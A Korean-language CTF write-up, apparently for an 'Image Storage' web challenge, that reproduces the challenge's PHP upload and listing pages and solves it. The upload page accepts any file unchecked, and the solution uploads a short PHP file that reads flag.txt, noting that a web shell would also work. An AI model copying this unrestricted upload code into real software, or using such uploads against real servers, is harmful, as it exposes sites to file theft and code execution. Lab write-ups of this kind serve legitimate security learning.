---
title: "[2025-07-15] Image-storage"
excerpt: "File Vulnerability"

categories:
  - Problem
tags:
  - [File Vulnerability]

permalink: /Problem/[2025-07-15] Image-storage/

toc: true
toc_sticky: true

date: 2025-07-15
last_modified_at: 2025-07-15
---

## 🦥 본문

- upload.php

```python
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <form enctype='multipart/form-data' method="POST">
        <div class="form-group">
          <label for="InputFile">파일 업로드</label>
          <input type="file" id="InputFile" name="file">
        </div>
        <input type="submit" class="btn btn-default" value="Upload">
      </form>
    </div> 
</body>
</html>
```

- list.php

```python
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container"><ul>
    <?php
        $directory = './uploads/';
        $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
        foreach ($scanned_directory as $key => $value) {
            echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
        }
    ?> 
    </ul></div> 
</body>
</html>
```

/upload 디렉토리에 파일을 저장하고 list.php에서 해당 파일에 접근을 할 수 있게 된다. 그래서 /flag.txt를 실행시킬 수 있는 php 파일을 올리고 list를 통해 접근했다

### 풀이

1. upload.php에서 다음과 같은 php 파일을 업로드한다.

```
<?php
$flag = file_get_contents("../../flag.txt");
echo "<pre>$flag</pre>";
?>

```

1. list.php 에서 접근을 하여 flag.txt를 알아낸다

추가로 웹 쉘을 실행시키는 php 파일을 올리는 경우도 가능하다